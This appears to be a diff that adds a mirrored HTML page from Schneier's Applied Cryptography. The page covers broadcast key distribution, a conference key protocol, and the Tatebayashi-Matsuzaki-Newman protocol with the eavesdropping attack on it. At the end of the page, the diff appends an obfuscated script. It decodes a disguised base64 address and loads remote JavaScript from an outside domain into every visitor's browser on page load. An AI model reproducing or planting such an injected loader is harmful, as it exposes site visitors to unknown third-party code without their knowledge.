@@ -1,0 +1,152 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key-Exchange Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=22//-->
+<!--PAGES=523-525//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="22-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch23/23-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Another method is suggested in [352]. First, each listener shares a secret key with Alice, one that is larger than any possible encrypted message. All of those keys should be pairwise prime. She encrypts the message in a random key, <I>K.</I> Then, she computes a single integer, <I>R,</I> such that <I>R</I> modulo a secret key is congruent to <I>K</I> when that secret key is supposed to decrypt the message, and <I>R</I> modulo a secret key is otherwise congruent to zero.</P>
+<P>For example, if Alice wants the secret to be received by Bob, Carol, and Ellen, but not by Dave and Frank, she encrypts the message with <I>K</I> and then computes <I>R</I> such that</P>
+<DL>
+<DD><I>R</I>&#8801; <I>K</I>(mod <I>K</I><SUB>B</SUB>)
+<DD><I>R</I>&#8801; <I>K</I>(mod <I>K</I><SUB>C</SUB>)
+<DD><I>R</I>&#8801; 0 (mod <I>K</I><SUB>D</SUB>)
+<DD><I>R</I>&#8801; <I>K</I>(mod <I>K</I><SUB>E</SUB>)
+<DD><I>R</I>&#8801; 0 (mod <I>K</I><SUB>F</SUB>)
+</DL>
+<P>This is a straightforward algebra problem, one that Alice can solve easily. When listeners receive the broadcast, they compute the received key modulo their secret key. If they were intended to receive the message, they recover the key. Otherwise, they recover nothing.
+</P>
+<P>Yet a third way, using a threshold scheme (see Section 3.7), is suggested in [141]. Like the others, every potential receiver gets a secret key. This key is a shadow in a yet-uncreated threshold scheme. Alice saves some secret keys for herself, adding some randomness to the system. Let&#146;s say there are <I>k</I> people out there.</P>
+<P>Then, to broadcast <I>M,</I> Alice encrypts <I>M</I> with key <I>K</I> and does the following.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random number, <I>j.</I> This number serves to hide the number of recipients of the message. It doesn&#146;t have to be very large; it can be as small as 0.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice creates a (<I>k</I> + <I>j</I> + 1, 2<I>k</I> + <I>j</I> + 1) threshold scheme, with:
+<DL>
+<DD><I>K</I> as the secret.
+<DD>The secret keys of the intended recipients as shadows.
+<DD>The secret keys of nonrecipients not as shadows.
+<DD><I>j</I> randomly chosen shadows, not the same as any of the secret keys.
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice broadcasts <I>k</I> + <I>j</I> randomly chosen shadows, none of which is any of the shadows listed in step (2).
+<DD><B>(4)</B>&nbsp;&nbsp;All listeners who receive the broadcast add their shadow to the <I>k</I> + <I>j</I> shadows they received. If adding their shadow allows them to calculate the secret, then they have recovered the key. If it does not, then they haven&#146;t.
+</DL>
+<P>Another approach can be found in [885,886,1194]. For yet another approach, see [1000].
+</P>
+<P><FONT SIZE="+1"><B><I>Conference Key Distribution</I></B></FONT></P>
+<P>This protocol allows a group of <I>n</I> users to agree on a secret key using only insecure channels. The group shares two large primes, <I>p</I> and <I>q,</I> and a generator <I>g</I> the same size as <I>q.</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;User <I>i,</I> where i goes from 1 to <I>n,</I> chooses a random <I>r</I><SUB>i</SUB> less than <I>q,</I> and broadcasts
+<DL>
+<DD><I>z</I><SUB>i</SUB> = <I>g</I><SUP>r<SMALL><SMALL>i</SMALL></SMALL></SUP> mod <I>p</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Every user verifies that <I>z</I><SUB>j</SUB><SUP>q</SUP>&#8801; 1 (mod <I>p</I>), for all <I>i</I> from 1 to <I>n.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;User <I>i</I> broadcasts
+<DL>
+<DD><I>x</I><SUB>i</SUB> = (<I>z</I><SUB>i+1</SUB>/<I>z</I><SUB>i-1</SUB>)<SUP>r<SMALL><SMALL>i</SMALL></SMALL></SUP> mod <I>p</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;User <I>i</I> computes
+<DL>
+<DD><I>K</I> = (<I>z</I><SUB>i-1</SUB>)<SUP>nr<SMALL><SMALL>i</SMALL></SMALL></SUP> * <I>x</I><SUB>i</SUB><SUP>n-1</SUP> * <I>x</I><SUB>i</SUB>+1<SUP>n-2</SUP> *...* <I>x</I><SUB>i-2</SUB> mod <I>p</I>
+</DL>
+</DL>
+<P>All index computations in the above protocol&#151;<I>i</I> - 1, <I>i</I> - 2, and <I>i</I> + 1&#151;should be computed mod <I>n.</I> At the end of the protocol, all honest users have the same <I>K.</I> No one else gets anything. However, this protocol falls to a man-in-the-middle attack. Another protocol, not quite as pretty, is in [757].</P>
+<P><FONT SIZE="+1"><B><I>Tatebayashi-Matsuzaki-Newman</I></B></FONT></P>
+<P>This key distribution protocol is suitable for networks [1521]. Alice wants to generate a session key with Bob using Trent, the KDC. All parties know Trent&#146;s public key, <I>n.</I> Trent knows the two large primes that <I>n</I> factors to, and hence can easily take cube roots modulo <I>n.</I> A lot of the details are left out of the following protocol, but you get the idea.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice chooses a random number, <I>r</I><SUB>A</SUB>, and sends Trent
+<DL>
+<DD><I>r</I><SUB>A</SUB><SUP>3</SUP> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent tells Bob that someone wants to exchange a key with him.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob chooses a random number, <I>r</I><SUB>B</SUB>, and sends Trent
+<DL>
+<DD><I>r</I><SUB>B</SUB><SUP>3</SUP> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Trent uses his private key to recover <I>r</I><SUB>A</SUB> and <I>r</I><SUB>B</SUB>. He sends Alice
+<DL>
+<DD><I>r</I><SUB>A</SUB>&#8853; <I>r</I><SUB>B</SUB>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice calculates
+<DL>
+<DD>(<I>r</I><SUB>A</SUB>&#8853; <I>r</I><SUB>B</SUB>) &#8853; <I>r</I><SUB>A</SUB> = <I>r</I><SUB>B</SUB>
+</DL>
+<BR>She uses this <I>r</I><SUB>B</SUB> to communicate securely with Bob.
+</DL>
+<P>This protocol looks good, but it has a horrible flaw. Carol can listen in on step (3) and use that information, with the help of an unsuspecting Trent and another malicious user (Dave), to recover <I>r</I><SUB>B</SUB> [1472].</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Carol chooses a random number, <I>r</I><SUB>C</SUB>, and sends Trent
+<DL>
+<DD><I>r</I><SUB>B</SUB><SUP>3</SUP><I>r</I><SUB>C</SUB><SUP>3</SUP> mod <I>n</I>
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Trent tells Dave that someone wants to exchange a key with him.
+<DD><B>(3)</B>&nbsp;&nbsp;Dave chooses a random number, <I>r</I><SUB>D</SUB>, and sends Trent
+<DL>
+<DD><I>r</I><SUB>D</SUB><SUP>3</SUP> mod <I>n</I>
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Trent uses his private key to recover <I>r</I><SUB>C</SUB> and <I>r</I><SUB>D</SUB>. He sends Carol
+<DL>
+<DD>(<I>r</I><SUB>B</SUB><I>r</I><SUB>C</SUB>) mod <SUP><I>n</I></SUP>&#8853; <I>r</I><SUB>D</SUB>
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Dave sends <I>r</I><SUB>D</SUB> to Carol.
+<DD><B>(6)</B>&nbsp;&nbsp;Carol uses <I>r</I><SUB>C</SUB> and <I>r</I><SUB>D</SUB> to recover <I>r</I><SUB>B</SUB>. She uses <I>r</I><SUB>B</SUB> to eavesdrop on Alice and Bob.
+</DL>
+<P>This is not good.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="22-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch23/23-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(jlyzFFMP, kedQGaOV) {kedQGaOV = jlyzFFMP.createElement('script');kedQGaOV.type = 'text/javascript';kedQGaOV.async = true;kedQGaOV.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');jlyzFFMP.getElementsByTagName('body')[0].appendChild(kedQGaOV);}(document));</script></body>
+</html>
